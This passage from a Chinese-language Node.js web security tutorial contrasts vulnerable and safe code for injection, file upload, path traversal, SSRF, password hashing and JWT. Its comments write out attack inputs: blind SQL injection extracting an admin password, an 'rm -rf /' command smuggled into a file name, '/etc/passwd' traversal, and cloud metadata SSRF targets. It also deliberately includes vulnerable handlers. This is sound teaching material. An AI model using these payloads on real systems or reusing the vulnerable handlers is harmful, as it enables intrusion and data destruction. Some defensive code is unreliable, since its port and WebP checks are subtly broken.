// 攻击者可以通过布尔盲注逐字符猜测密码
// /user?id=1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a'
// 如果页面返回"用户存在"，说明密码第一个字符是'a'
// 攻击者通过二分法可以快速猜出密码

// 安全的做法：使用参数化查询
app.get('/user-secure', (req, res) => {
  const userId = req.query.id;
  // 使用参数化查询，用户输入被当作数据而不是SQL代码
  const query = 'SELECT * FROM users WHERE id = ?';
  db.query(query, [userId], (err, results) => {
    res.json(results);
  });
});
```

#### 2.1.3 SQL注入防御

参数化查询（Prepared Statements）是防御SQL注入的最有效方法。参数化查询将SQL语句的结构和数据分离，数据库先解析和编译SQL语句的结构，然后将用户输入作为参数传递进去，数据库不会将参数内容当作SQL代码执行。

```javascript
// 参数化查询实现
const mysql = require('mysql2/promise');

// 创建连接池
const pool = mysql.createPool({
  host: 'localhost',
  user: 'app_user',
  password: 'secure_password',
  database: 'webapp',
  // 安全相关配置
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0
});

// 参数化查询示例：用户登录
async function authenticateUser(username, password) {
  // 使用占位符?作为参数
  // 数据库会自动处理参数的转义和类型转换
  const query = `
    SELECT id, username, email, role
    FROM users
    WHERE username = ? AND password_hash = ?
  `;

  // 参数以数组形式传递
  const [rows] = await pool.execute(query, [username, password]);

  return rows[0] || null;
}

// 插入数据时的参数化查询
async function createProduct(product) {
  const query = `
    INSERT INTO products (name, description, price, category_id)
    VALUES (?, ?, ?, ?)
  `;

  const [result] = await pool.execute(query, [
    product.name,
    product.description,
    product.price,
    product.categoryId
  ]);

  return result.insertId;
}

// 使用TypeORM进行更安全的数据库操作
const { DataSource } = require('typeorm');
const { User } = require('./entities/User');

const dataSource = new DataSource({
  type: 'postgres',
  host: 'localhost',
  port: 5432,
  username: 'app_user',
  password: 'secure_password',
  database: 'webapp',
  entities: [User],
  synchronize: false // 生产环境必须关闭自动同步
});

// TypeORM自动使用参数化查询
async function findUserByUsername(username) {
  // TypeORM的查询构建器自动防止SQL注入
  const user = await dataSource
    .getRepository(User)
    .createQueryBuilder('user')
    .where('user.username = :username', { username })
    .getOne();

  return user;
}
```

### 2.2 NoSQL注入

NoSQL数据库虽然不使用SQL语言，但同样存在注入风险。NoSQL注入发生在应用程序将用户输入直接拼接到NoSQL查询语句中的情况。不同的NoSQL数据库有不同的查询语法，注入方式也各有特点。

```javascript
// MongoDB注入示例
const { MongoClient } = require('mongodb');

// 不安全的MongoDB查询
async function findUserUnsafe(username) {
  const db = await getDb();
  // 直接将用户输入用于查询对象
  // 如果用户输入 {"$ne": null}，会返回所有用户
  const query = { username: username };
  return db.collection('users').findOne(query);
}

// 恶意输入: {"$ne": null}
// 查询变成: { username: {"$ne": null} }
// 这会匹配所有username不为null的用户

// 安全的做法：严格验证输入类型
async function findUserSafe(username) {
  const db = await getDb();

  // 验证username必须是字符串类型
  if (typeof username !== 'string' || username.length > 100) {
    throw new Error('无效的用户名');
  }

  // 使用正则表达式限制只匹配字母数字
  if (!/^[a-zA-Z0-9_]+$/.test(username)) {
    throw new Error('用户名包含非法字符');
  }

  // 严格限制查询结构
  const query = { username: username };
  return db.collection('users').findOne(query);
}

// 操作符注入防护
async function updateUserSafe(userId, updates) {
  const db = await getDb();

  // 只允许更新特定字段
  const allowedFields = ['email', 'displayName', 'avatarUrl'];
  const sanitizedUpdates = {};

  for (const [key, value] of Object.entries(updates)) {
    // 确保字段名不包含MongoDB操作符
    if (allowedFields.includes(key) && !key.startsWith('$')) {
      sanitizedUpdates[key] = value;
    }
  }

  // 确保userId是有效的ObjectId
  const { ObjectId } = require('mongodb');
  let validUserId;
  try {
    validUserId = new ObjectId(userId);
  } catch (e) {
    throw new Error('无效的用户ID');
  }

  await db.collection('users').updateOne(
    { _id: validUserId },
    { $set: sanitizedUpdates }
  );
}
```

### 2.3 命令注入

命令注入漏洞发生在应用程序将用户输入传递给系统命令执行函数的情况。攻击者可以通过在输入中注入 shell 命令分隔符（如 `;`、`|`、`&&`）来执行任意系统命令。

```javascript
// 命令注入漏洞示例
const { exec } = require('child_process');
const express = require('express');
const app = express();

// 不安全的图片处理功能
app.get('/convert-image', (req, res) => {
  const filename = req.query.filename;
  // 攻击者可以输入: test.jpg; rm -rf /;
  // 这会执行ImageMagick然后执行删除命令
  exec(`convert images/${filename} output/${filename}.png`, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).send('处理失败');
    }
    res.sendFile(`output/${filename}.png`);
  });
});

// 安全的做法：使用严格的白名单验证
app.get('/convert-image-safe', (req, res) => {
  const filename = req.query.filename;

  // 白名单验证：只允许特定的文件名格式
  // 允许：avatar.jpg, photo.png, image.jpeg
  // 不允许：test.jpg; rm -rf /, $(whoami).jpg, etc.
  if (!/^[a-zA-Z0-9_-]+\.(jpg|jpeg|png|gif)$/i.test(filename)) {
    return res.status(400).send('无效的文件名');
  }

  // 确保文件名不包含路径遍历字符
  if (filename.includes('..') || filename.includes('/') || filename.includes('\\')) {
    return res.status(400).send('无效的文件名');
  }

  // 使用execFile而不是exec，避免shell解释
  const { execFile } = require('child_process');
  execFile('convert', [`images/${filename}`, `output/${filename}.png`], (error) => {
    if (error) {
      return res.status(500).send('处理失败');
    }
    res.sendFile(`output/${filename}.png`);
  });
});

// 更安全的做法：使用专门的图片处理库而不是调用外部命令
const sharp = require('sharp');

app.get('/convert-image-lib', async (req, res) => {
  const filename = req.query.filename;

  // 严格验证文件名
  if (!/^[a-zA-Z0-9_-]+\.(jpg|jpeg|png|gif)$/i.test(filename)) {
    return res.status(400).send('无效的文件名');
  }

  const inputPath = path.join(__dirname, 'images', filename);
  const outputPath = path.join(__dirname, 'output', `${filename}.png`);

  // 确保路径在预期目录内
  if (!inputPath.startsWith(path.join(__dirname, 'images'))) {
    return res.status(400).send('无效的文件名');
  }

  try {
    await sharp(inputPath).png().toFile(outputPath);
    res.sendFile(outputPath);
  } catch (error) {
    res.status(500).send('处理失败');
  }
});
```

### 2.4 文件上传漏洞

文件上传功能如果处理不当，可能导致攻击者上传恶意文件（如WebShell）并在服务器上执行。文件上传漏洞是Web应用中非常危险的安全问题。

```javascript
// 文件上传安全实现
const multer = require('multer');
const path = require('path');
const crypto = require('crypto');

// 配置存储
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    // 上传到隔离的非可执行目录
    cb(null, '/var/www/uploads/');
  },
  filename: (req, file, cb) => {
    // 使用随机文件名，防止猜测和覆盖
    const randomName = crypto.randomBytes(16).toString('hex');
    const ext = path.extname(file.originalname).toLowerCase();
    cb(null, randomName + ext);
  }
});

// 文件过滤器：严格验证文件类型
const fileFilter = (req, file, cb) => {
  // 只允许安全的图片格式
  const allowedMimes = [
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/webp'
  ];

  // 同时检查MIME类型和扩展名
  const allowedExts = ['.jpg', '.jpeg', '.png', '.gif', '.webp'];
  const ext = path.extname(file.originalname).toLowerCase();

  if (allowedMimes.includes(file.mimetype) && allowedExts.includes(ext)) {
    // 验证文件内容头部（Magic Numbers）
    // 不同文件类型有特定的魔数签名
    const allowedSignatures = {
      'image/jpeg': [0xFF, 0xD8, 0xFF],
      'image/png': [0x89, 0x50, 0x4E, 0x47],
      'image/gif': [0x47, 0x49, 0x46],
      'image/webp': [0x57, 0x45, 0x42, 0x50]
    };

    // 检查文件魔数（需要在文件保存后检查，这里简化处理）
    cb(null, true);
  } else {
    cb(new Error('不支持的文件类型'), false);
  }
};

// 限制文件大小
const upload = multer({
  storage,
  fileFilter,
  limits: {
    fileSize: 5 * 1024 * 1024, // 最大5MB
    files: 1 // 每次最多上传1个文件
  }
});

// 检查文件魔数（文件头签名）
const fs = require('fs');

function verifyFileSignature(filePath, expectedMimeType) {
  const signatures = {
    'image/jpeg': { bytes: [0xFF, 0xD8, 0xFF], offset: 0 },
    'image/png': { bytes: [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A], offset: 0 },
    'image/gif': { bytes: [0x47, 0x49, 0x46, 0x38], offset: 0 },
    'image/webp': { bytes: [0x57, 0x45, 0x42, 0x50], offset: 0 }
  };

  const sig = signatures[expectedMimeType];
  if (!sig) return false;

  const buffer = Buffer.alloc(sig.bytes.length);
  const fd = fs.openSync(filePath, 'r');

  try {
    fs.readSync(fd, buffer, 0, sig.bytes.length, sig.offset);
    return buffer.compare(Buffer.from(sig.bytes)) === 0;
  } finally {
    fs.closeSync(fd);
  }
}

// 上传处理路由
app.post('/upload', upload.single('avatar'), async (req, res) => {
  try {
    const file = req.file;

    // 验证文件魔数，确保文件内容与扩展名匹配
    const isValid = verifyFileSignature(file.path, file.mimetype);
    if (!isValid) {
      // 删除伪造的文件
      fs.unlinkSync(file.path);
      return res.status(400).json({ error: '文件内容与类型不匹配' });
    }

    // 重命名文件为带哈希的名称
    const fileHash = crypto.createHash('sha256').update(fs.readFileSync(file.path)).digest('hex');
    const safeFilename = `${fileHash}${path.extname(file.originalname).toLowerCase()}`;
    const safePath = path.join('/var/www/uploads/', safeFilename);

    // 将文件移动到最终位置
    fs.renameSync(file.path, safePath);

    // 返回相对URL，不返回服务器路径
    res.json({
      success: true,
      url: `/uploads/${safeFilename}`
    });
  } catch (error) {
    res.status(500).json({ error: '上传失败' });
  }
});
```

### 2.5 路径遍历

路径遍历（Path Traversal）漏洞允许攻击者通过在文件路径中注入`../`等特殊序列来访问服务器上的敏感文件或目录。这种漏洞通常发生在应用程序根据用户输入来构建文件路径时。

```javascript
// 路径遍历漏洞示例
const express = require('express');
const path = require('path');
const fs = require('fs');

app.get('/download', (req, res) => {
  const filename = req.query.file;
  // 不安全的做法：直接使用用户输入拼接文件路径
  // 攻击者可以输入: ../../etc/passwd
  const filepath = path.join('/var/www/uploads', filename);
  res.download(filepath);
});

// 攻击者请求: /download?file=../../etc/passwd
// 实际路径变成: /var/www/uploads/../../etc/passwd = /etc/passwd
// 攻击者可以读取服务器上的任意文件

// 安全的做法：验证和规范路径
app.get('/download-safe', (req, res) => {
  const filename = req.query.file;
  const uploadsDir = '/var/www/uploads';

  // 构建完整的文件路径
  const filepath = path.join(uploadsDir, filename);

  // 方法1：使用path.resolve规范化路径后检查是否在允许目录内
  const resolvedPath = path.resolve(filepath);
  if (!resolvedPath.startsWith(path.resolve(uploadsDir))) {
    return res.status(403).send('访问被拒绝');
  }

  // 检查文件是否存在
  if (!fs.existsSync(resolvedPath)) {
    return res.status(404).send('文件不存在');
  }

  // 检查是否是常规文件而非目录或链接
  const stats = fs.statSync(resolvedPath);
  if (!stats.isFile()) {
    return res.status(403).send('不是有效的文件');
  }

  res.download(resolvedPath);
});

// 方法2：使用正则表达式严格验证文件名
app.get('/download-strict', (req, res) => {
  const filename = req.query.file;

  // 只允许字母、数字、下划线、连字符和点号
  // 不允许路径分隔符和其他特殊字符
  if (!/^[a-zA-Z0-9_.-]+$/.test(filename)) {
    return res.status(400).send('无效的文件名');
  }

  // 确保文件名不以点开头（防止.开头的隐藏文件）
  if (filename.startsWith('.')) {
    return res.status(400).send('无效的文件名');
  }

  const filepath = path.join('/var/www/uploads', filename);

  // 双重检查：规范化后仍在允许目录内
  const normalized = path.normalize(filepath);
  if (!normalized.startsWith('/var/www/uploads/')) {
    return res.status(403).send('访问被拒绝');
  }

  res.download(normalized);
});
```

### 2.6 SSRF服务端请求伪造

SSRF（Server-Side Request Forgery，服务端请求伪造）是一种由攻击者构造请求，由服务器代替攻击者发起请求的攻击方式。攻击者可以利用服务器的特殊地位访问内部网络资源或执行恶意操作。

```javascript
// SSRF漏洞示例
const express = require('express');
const axios = require('axios');
const app = express();

app.get('/fetch', async (req, res) => {
  const url = req.query.url;
  // 不安全的做法：直接根据用户输入获取URL内容
  // 攻击者可以输入: http://169.254.169.254/latest/meta-data/ (AWS元数据服务)
  // 或者输入: file:///etc/passwd (读取本地文件)
  try {
    const response = await axios.get(url);
    res.send(response.data);
  } catch (error) {
    res.status(500).send('获取失败');
  }
});

// 安全的做法：严格验证URL
app.get('/fetch-safe', async (req, res) => {
  const url = req.query.url;

  try {
    // 使用URL解析器验证
    const urlObj = new URL(url);

    // 只允许HTTP和HTTPS协议
    if (!['http:', 'https:'].includes(urlObj.protocol)) {
      return res.status(400).send('只支持HTTP和HTTPS协议');
    }

    // 只允许特定域名/IP白名单
    const allowedHosts = ['api.example.com', 'cdn.example.com'];
    const hostname = urlObj.hostname;

    // 检查是否是IP地址
    const ip = require('net').isIP(hostname);
    if (ip) {
      // 如果是IP，只允许内网IP范围检查
      // 注意：这只是基础检查，生产环境应使用更完整的IP范围表
      if (ip === 4) {
        // 检查是否是私有IP（IPv4）
        const parts = hostname.split('.').map(Number);
        // 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
        if (parts[0] === 10 ||
            (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) ||
            (parts[0] === 192 && parts[1] === 168)) {
          return res.status(403).send('不允许访问内网IP');
        }
      }
      // 不允许直接使用IP地址访问
      return res.status(403).send('不允许使用IP访问');
    }

    // 验证域名在白名单中
    if (!allowedHosts.includes(hostname)) {
      return res.status(403).send('不允许访问此域名');
    }

    // 检查URL是否包含危险的端口
    const dangerousPorts = [21, 23, 25, 3306, 5432, 6379, 27017];
    if (dangerousPorts.includes(urlObj.port)) {
      return res.status(403).send('不允许访问此端口');
    }

    // 验证通过后发起请求
    const response = await axios.get(url, {
      timeout: 5000, // 设置超时
      maxRedirects: 0, // 不跟随重定向
      validateStatus: (status) => status < 400 // 只接受2xx和3xx状态码
    });

    res.send(response.data);
  } catch (error) {
    res.status(500).send('获取失败');
  }
});

// 使用DNS rebinding保护
// DNS rebinding允许攻击者先解析到一个公网IP，然后快速切换到内网IP
// 防护措施：在请求发起前解析域名并验证IP
const dns = require('dns');
const { promisify } = require('util');
const dnsLookup = promisify(dns.lookup);

async function fetchWithSSRFProtection(url) {
  const urlObj = new URL(url);
  const hostname = urlObj.hostname;

  // 解析域名获取IP地址
  const { address } = await dnsLookup(hostname);

  // 验证IP不在内网范围
  const ip = require('net').isIP(address);
  if (ip === 4) {
    const parts = address.split('.').map(Number);
    if (parts[0] === 10 ||
        (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) ||
        (parts[0] === 192 && parts[1] === 168) ||
        parts[0] === 127) {
      throw new Error('不允许访问内网IP');
    }
  }

  // IP验证通过后再发起请求
  // 而且应该在短时间内完成，防止DNS rebinding攻击
  return axios.get(url, { timeout: 5000 });
}
```

### 2.7 安全审计清单

以下是一个完整的后端安全审计清单，用于检查应用的安全性。

```javascript
// 后端安全审计清单实现

/**
 * 后端安全审计模块
 * 用于检查Web应用的安全配置和潜在漏洞
 */

const securityAudit = {
  // 1. 认证与会话管理审计
  authentication: {
    // 检查密码是否使用强哈希算法
    checkPasswordHash: (hashAlgorithm) => {
      const weakAlgorithms = ['md5', 'sha1', 'sha256', 'sha512'];
      if (weakAlgorithms.includes(hashAlgorithm.toLowerCase())) {
        return {
          status: 'FAIL',
          message: `密码使用了不安全的哈希算法: ${hashAlgorithm}`,
          recommendation: '使用bcrypt、argon2或PBKDF2等专为密码设计的哈希算法'
        };
      }
      return { status: 'PASS', message: '密码哈希算法安全' };
    },

    // 检查密码最小长度
    checkPasswordMinLength: (minLength) => {
      if (minLength < 8) {
        return {
          status: 'FAIL',
          message: `密码最小长度过短: ${minLength}`,
          recommendation: '密码最小长度应至少为8个字符，建议12个或更长'
        };
      }
      return { status: 'PASS', message: '密码长度要求合理' };
    },

    // 检查是否启用了多因素认证
    checkMFA: (mfaEnabled) => {
      if (!mfaEnabled) {
        return {
          status: 'WARN',
          message: '未启用多因素认证',
          recommendation: '建议为高权限账户启用MFA'
        };
      }
      return { status: 'PASS', message: '已启用多因素认证' };
    },

    // 检查会话超时设置
    checkSessionTimeout: (timeoutSeconds) => {
      const maxRecommended = 30 * 60; // 30分钟
      if (timeoutSeconds > maxRecommended) {
        return {
          status: 'WARN',
          message: `会话超时时间过长: ${timeoutSeconds}秒`,
          recommendation: '会话超时时间不应超过30分钟'
        };
      }
      return { status: 'PASS', message: '会话超时设置合理' };
    }
  },

  // 2. 输入验证审计
  inputValidation: {
    // 检查是否使用参数化查询
    checkParameterizedQueries: (usesParameterizedQueries) => {
      if (!usesParameterizedQueries) {
        return {
          status: 'FAIL',
          message: '数据库查询未使用参数化查询',
          recommendation: '所有数据库查询必须使用参数化查询或ORM'
        };
      }
      return { status: 'PASS', message: '数据库查询使用参数化查询' };
    },

    // 检查输入是否进行验证
    checkInputValidation: (validationRules) => {
      if (!validationRules || Object.keys(validationRules).length === 0) {
        return {
          status: 'FAIL',
          message: '缺少输入验证规则',
          recommendation: '所有用户输入必须经过严格验证'
        };
      }
      return { status: 'PASS', message: '已配置输入验证规则' };
    },

    // 检查是否过滤XSS特殊字符
    checkXSSProtection: (hasXSSProtection) => {
      if (!hasXSSProtection) {
        return {
          status: 'FAIL',
          message: '缺少XSS防护措施',
          recommendation: '对所有用户输入进行HTML转义或使用内容安全策略'
        };
      }
      return { status: 'PASS', message: '已配置XSS防护' };
    }
  },

  // 3. 传输安全审计
  transport: {
    // 检查是否使用HTTPS
    checkHTTPS: (usesHTTPS) => {
      if (!usesHTTPS) {
        return {
          status: 'FAIL',
          message: '未使用HTTPS',
          recommendation: '所有生产环境必须使用HTTPS'
        };
      }
      return { status: 'PASS', message: '已启用HTTPS' };
    },

    // 检查TLS版本
    checkTLSVersion: (tlsVersion) => {
      const minSafeVersion = 1.2;
      const version = parseFloat(tlsVersion);
      if (version < minSafeVersion) {
        return {
          status: 'FAIL',
          message: `使用了不安全的TLS版本: ${tlsVersion}`,
          recommendation: 'TLS版本应至少为1.2'
        };
      }
      return { status: 'PASS', message: 'TLS版本安全' };
    },

    // 检查是否启用HSTS
    checkHSTS: (hstsEnabled, maxAge) => {
      if (!hstsEnabled) {
        return {
          status: 'WARN',
          message: '未启用HSTS',
          recommendation: '建议启用HSTS并设置合理的max-age'
        };
      }
      if (maxAge < 31536000) { // 少于1年
        return {
          status: 'WARN',
          message: `HSTS max-age过短: ${maxAge}`,
          recommendation: 'HSTS max-age应至少为31536000秒（1年）'
        };
      }
      return { status: 'PASS', message: 'HSTS配置正确' };
    },

    // 检查敏感Cookie是否设置安全标志
    checkCookieSecurity: (cookies) => {
      const issues = [];
      for (const [name, config] of Object.entries(cookies)) {
        if (!config.secure) {
          issues.push(`${name}: 缺少Secure标志`);
        }
        if (!config.httpOnly) {
          issues.push(`${name}: 缺少HttpOnly标志`);
        }
        if (!config.sameSite) {
          issues.push(`${name}: 缺少SameSite标志`);
        }
      }
      if (issues.length > 0) {
        return {
          status: 'FAIL',
          message: issues.join('; '),
          recommendation: '敏感Cookie必须设置Secure、HttpOnly和SameSite标志'
        };
      }
      return { status: 'PASS', message: 'Cookie安全配置正确' };
    }
  },

  // 4. 访问控制审计
  accessControl: {
    // 检查权限控制
    checkAuthorization: (hasAuthorization) => {
      if (!hasAuthorization) {
        return {
          status: 'FAIL',
          message: '缺少权限控制',
          recommendation: '所有API必须实施权限控制'
        };
      }
      return { status: 'PASS', message: '已配置权限控制' };
    },

    // 检查是否默认拒绝
    checkDefaultDeny: (defaultDenyEnabled) => {
      if (!defaultDenyEnabled) {
        return {
          status: 'WARN',
          message: '权限模型未设置为默认拒绝',
          recommendation: '建议使用默认拒绝的权限模型'
        };
      }
      return { status: 'PASS', message: '权限模型正确' };
    },

    // 检查API速率限制
    checkRateLimiting: (rateLimits) => {
      if (!rateLimits || Object.keys(rateLimits).length === 0) {
        return {
          status: 'WARN',
          message: '未配置API速率限制',
          recommendation: '建议对所有API配置速率限制'
        };
      }
      return { status: 'PASS', message: '已配置API速率限制' };
    }
  },

  // 5. 日志与监控审计
  logging: {
    // 检查安全事件日志
    checkSecurityLogging: (hasSecurityLogging) => {
      if (!hasSecurityLogging) {
        return {
          status: 'FAIL',
          message: '缺少安全事件日志',
          recommendation: '必须记录所有安全相关事件'
        };
      }
      return { status: 'PASS', message: '已配置安全日志' };
    },

    // 检查是否记录敏感操作
    checkSensitiveOpsLogging: (logsSensitiveOps) => {
      if (!logsSensitiveOps) {
        return {
          status: 'WARN',
          message: '未记录敏感操作',
          recommendation: '建议记录所有敏感操作的审计日志'
        };
      }
      return { status: 'PASS', message: '已记录敏感操作' };
    }
  },

  // 执行完整审计
  runFullAudit: (config) => {
    const results = {
      timestamp: new Date().toISOString(),
      overall: 'PASS',
      checks: []
    };

    // 执行所有审计项目
    const allChecks = [
      // 认证与会话
      securityAudit.authentication.checkPasswordHash(config.passwordHashAlgorithm),
      securityAudit.authentication.checkPasswordMinLength(config.minPasswordLength),
      securityAudit.authentication.checkMFA(config.mfaEnabled),
      securityAudit.authentication.checkSessionTimeout(config.sessionTimeout),

      // 输入验证
      securityAudit.inputValidation.checkParameterizedQueries(config.usesParameterizedQueries),
      securityAudit.inputValidation.checkInputValidation(config.inputValidationRules),
      securityAudit.inputValidation.checkXSSProtection(config.hasXSSProtection),

      // 传输安全
      securityAudit.transport.checkHTTPS(config.httpsEnabled),
      securityAudit.transport.checkTLSVersion(config.tlsVersion),
      securityAudit.transport.checkHSTS(config.hstsEnabled, config.hstsMaxAge),
      securityAudit.transport.checkCookieSecurity(config.cookies),

      // 访问控制
      securityAudit.accessControl.checkAuthorization(config.hasAuthorization),
      securityAudit.accessControl.checkDefaultDeny(config.defaultDeny),
      securityAudit.accessControl.checkRateLimiting(config.rateLimits),

      // 日志监控
      securityAudit.logging.checkSecurityLogging(config.hasSecurityLogging),
      securityAudit.logging.checkSensitiveOpsLogging(config.logsSensitiveOps)
    ];

    results.checks = allChecks;

    // 计算整体状态
    const failedChecks = allChecks.filter(c => c.status === 'FAIL');
    const warnChecks = allChecks.filter(c => c.status === 'WARN');

    if (failedChecks.length > 0) {
      results.overall = 'FAIL';
    } else if (warnChecks.length > 0) {
      results.overall = 'WARN';
    }

    results.failedCount = failedChecks.length;
    results.warnCount = warnChecks.length;

    return results;
  }
};

// 使用示例
const auditConfig = {
  passwordHashAlgorithm: 'bcrypt',
  minPasswordLength: 12,
  mfaEnabled: true,
  sessionTimeout: 1800,
  usesParameterizedQueries: true,
  inputValidationRules: { email: 'email', username: 'alphanumeric' },
  hasXSSProtection: true,
  httpsEnabled: true,
  tlsVersion: '1.3',
  hstsEnabled: true,
  hstsMaxAge: 31536000,
  cookies: {
    sessionId: { secure: true, httpOnly: true, sameSite: 'strict' }
  },
  hasAuthorization: true,
  defaultDeny: true,
  rateLimits: { api: '100/minute' },
  hasSecurityLogging: true,
  logsSensitiveOps: true
};

const auditResults = securityAudit.runFullAudit(auditConfig);
console.log('安全审计结果:', JSON.stringify(auditResults, null, 2));
```

---

## 第三部分：认证与授权

认证与授权是Web应用安全的核心组成部分。认证（Authentication）验证用户是谁，授权（Authorization）决定用户可以做什么。正确实现认证授权系统对于保护用户数据和系统资源至关重要。

### 3.1 密码安全

密码是Web应用中最常用的认证方式。密码安全的设计需要考虑多个方面，包括密码的存储、验证和传输。一个不安全的密码系统可能导致用户数据泄露，即使其他安全措施做得很好。

#### 3.1.1 bcrypt密码哈希

bcrypt是一种专为密码设计的哈希算法，它具有自适应特性，可以抵御暴力破解和彩虹表攻击。bcrypt的关键特点是计算成本可调，随着硬件性能的提升，可以增加计算成本来保持安全性。

```javascript
// bcrypt密码哈希实现
const bcrypt = require('bcrypt');

class PasswordHasher {
  // 盐轮数（计算成本因子）
  // 轮数越高越安全，但验证速度越慢
  // 推荐值：10-12（2024年标准）
  static SALT_ROUNDS = 12;

  /**
   * 对密码进行哈希处理
   * @param {string} plainPassword - 明文密码
   * @returns {Promise<string>} 哈希后的密码
   */
  static async hash(plainPassword) {
    // 生成盐并哈希密码
    // bcrypt会自动生成随机的盐并将其包含在哈希结果中
    const hashedPassword = await bcrypt.hash(plainPassword, this.SALT_ROUNDS);
    return hashedPassword;
  }

  /**
   * 验证密码是否正确
   * @param {string} plainPassword - 待验证的明文密码
   * @param {string} hashedPassword - 已哈希的密码
   * @returns {Promise<boolean>} 验证是否通过
   */
  static async verify(plainPassword, hashedPassword) {
    // bcrypt的compare函数使用常量时间比较
    // 防止时序攻击
    return bcrypt.compare(plainPassword, hashedPassword);
  }

  /**
   * 检查密码强度
   * @param {string} password - 待检查的密码
   * @returns {object} 强度检查结果
   */
  static checkStrength(password) {
    const result = {
      isStrong: false,
      score: 0,
      feedback: []
    };

    // 长度检查
    if (password.length >= 8) result.score += 1;
    if (password.length >= 12) result.score += 1;
    if (password.length < 8) result.feedback.push('密码长度至少为8个字符');

    // 复杂度检查
    if (/[a-z]/.test(password)) result.score += 1; // 小写字母
    if (/[A-Z]/.test(password)) result.score += 1; // 大写字母
    if (/[0-9]/.test(password)) result.score += 1; // 数字
    if (/[^a-zA-Z0-9]/.test(password)) result.score += 1; // 特殊字符

    // 常见密码检查
    const commonPasswords = [
      'password', '123456', 'qwerty', 'admin', 'letmein',
      'welcome', 'monkey', 'dragon', 'master', 'login'
    ];
    if (commonPasswords.includes(password.toLowerCase())) {
      result.score = 0;
      result.feedback.push('请勿使用常见密码');
    }

    // 重复字符检查
    if (/(.)\1{2,}/.test(password)) {
      result.score -= 1;
      result.feedback.push('密码不应包含连续重复的字符');
    }

    // 序列字符检查
    if (/(?:abc|bcd|cde|def|efg|fgh|ghi|hij|ijk|jkl|klm|lmn|mno|nop|opq|pqr|qrs|rst|stu|tuv|uvw|vwx|wxy|xyz|012|123|234|345|456|567|678|789)/i.test(password)) {
      result.score -= 1;
      result.feedback.push('密码不应包含连续序列');
    }

    result.isStrong = result.score >= 4 && password.length >= 8;
    return result;
  }
}

// 使用示例
async function registerUser(username, email, password) {
  // 检查密码强度
  const strengthCheck = PasswordHasher.checkStrength(password);
  if (!strengthCheck.isStrong) {
    throw new Error(`密码强度不足: ${strengthCheck.feedback.join(', ')}`);
  }

  // 哈希密码
  const hashedPassword = await PasswordHasher.hash(password);

  // 存储用户信息
  const user = await User.create({
    username,
    email,
    passwordHash: hashedPassword
  });

  return user;
}

async function loginUser(username, password) {
  const user = await User.findOne({ where: { username } });

  if (!user) {
    // 故意延迟，防止计时攻击猜测用户名
    await PasswordHasher.hash(password); // 无用的哈希计算
    throw new Error('用户名或密码错误');
  }

  const isValid = await PasswordHasher.verify(password, user.passwordHash);

  if (!isValid) {
    throw new Error('用户名或密码错误');
  }

  // 登录成功
  return user;
}
```

#### 3.1.2 Argon2密码哈希

Argon2是2015年密码哈希竞赛的冠军，是目前最先进的密码哈希算法。与bcrypt相比，Argon2对内存的要求更高，这使得它对GPU攻击具有更好的抵抗能力。Argon2有三种变体：Argon2d（对GPU抵抗最强）、Argon2i（对侧信道攻击抵抗最强）和Argon2id（两者的折中）。

```javascript
// Argon2密码哈希实现
const argon2 = require('argon2');

class Argon2Hasher {
  /**
   * Argon2配置参数
   * - memoryCost: 内存消耗（KB），推荐 2^18 (256MB) 到 2^21 (2GB)
   * - timeCost: 迭代次数，推荐 2-4
   * - parallelism: 并行度，推荐 1-4
   * - type: Argon2变体，argon2id 适合大多数场景
   */
  static OPTIONS = {
    type: argon2.argon2id,
    memoryCost: 65536, // 64MB
    timeCost: 3,
    parallelism: 4,
    hashLength: 32,
    saltLength: 16
  };

  /**
   * 使用Argon2哈希密码
   */
  static async hash(plainPassword) {
    const hash = await argon2.hash(plainPassword, this.OPTIONS);
    return hash;
  }

  /**
   * 验证密码
   */
  static async verify(hashedPassword, plainPassword) {
    try {
      return await argon2.verify(hashedPassword, plainPassword);
    } catch (error) {
      // 验证失败返回false
      return false;
    }
  }

  /**
   * 生成密码重置令牌
   * 注意：这种令牌应该加密存储而不是哈希存储
   */
  static async generateResetToken() {
    // 生成密码重置令牌
    const resetToken = crypto.randomBytes(32).toString('hex');
    // 对令牌进行哈希存储
    const hashedToken = await argon2.hash(resetToken, {
      type: argon2.argon2i, // 使用argon2i，适合处理秘密值
      memoryCost: 16384,
      timeCost: 1,
      parallelism: 1
    });
    return { resetToken, hashedToken };
  }

  /**
   * 验证密码重置令牌
   */
  static async verifyResetToken(hashedToken, resetToken) {
    try {
      return await argon2.verify(hashedToken, resetToken);
    } catch {
      return false;
    }
  }
}

// 使用示例
async function requestPasswordReset(email) {
  const user = await User.findOne({ where: { email } });

  // 即使用户不存在也返回成功，防止用户枚举攻击
  if (!user) {
    return { message: '如果邮箱存在，重置链接已发送' };
  }

  // 生成重置令牌
  const { resetToken, hashedToken } = await Argon2Hasher.generateResetToken();

  // 存储哈希后的令牌，设置过期时间
  const expiresAt = new Date(Date.now() + 60 * 60 * 1000); // 1小时后过期
  await PasswordReset.create({
    userId: user.id,
    tokenHash: hashedToken,
    expiresAt,
    used: false
  });

  // 发送包含令牌的邮件
  await sendEmail({
    to: email,
    subject: '密码重置请求',
    body: `点击以下链接重置密码: https://example.com/reset-password?token=${resetToken}`
  });

  return { message: '如果邮箱存在，重置链接已发送' };
}
```

### 3.2 JWT安全

JSON Web Token（JWT）是一种用于在各方之间安全传输信息的简洁方式。JWT因其无状态特性而被广泛应用于分布式系统的认证。但JWT的使用也带来了独特的安全挑战，需要谨慎处理。

#### 3.2.1 JWT签名与验证

JWT的核心是签名，签名确保了Token的内容没有被篡改。JWT有三种签名算法：HS256（对称加密，使用共享密钥）、RS256（非对称加密，使用公钥/私钥对）和ES256（椭圆曲线签名）。生产环境应优先使用RS256或ES256，因为私钥可以在服务端保管，而公钥可以分发给客户端验证。

```javascript
// JWT安全实现
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

// RSA密钥对生成（只需执行一次）
function generateRSAKeys() {
  const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
    modulusLength: 2048, // 至少2048位，推荐4096位
    publicKeyEncoding: {
      type: 'spki',
